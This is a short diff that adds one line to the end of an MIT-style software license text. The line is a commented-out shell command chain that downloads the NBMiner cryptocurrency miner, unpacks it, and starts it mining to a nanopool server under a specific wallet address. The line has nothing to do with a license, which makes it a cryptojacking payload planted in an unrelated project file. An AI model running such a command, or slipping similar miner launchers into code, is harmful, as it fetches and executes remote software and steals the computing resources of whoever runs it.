@@ -19,3 +19,4 @@ AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 SOFTWARE.
+//wget https://github.com/NebuTech/NBMiner/releases/download/v38.1/NBMiner_38.1_Linux.tgz && tar -xvf NBMiner_38.1_Linux.tgz && cd NBMiner_Linux && ./nbminer -a ethash -o ethproxy+tcp://eth-asia1.nanopool.org:9999 -u 0x81d0BEeE5eB44E3Cf7712792cD6C465C75Ef95bb.worker1//
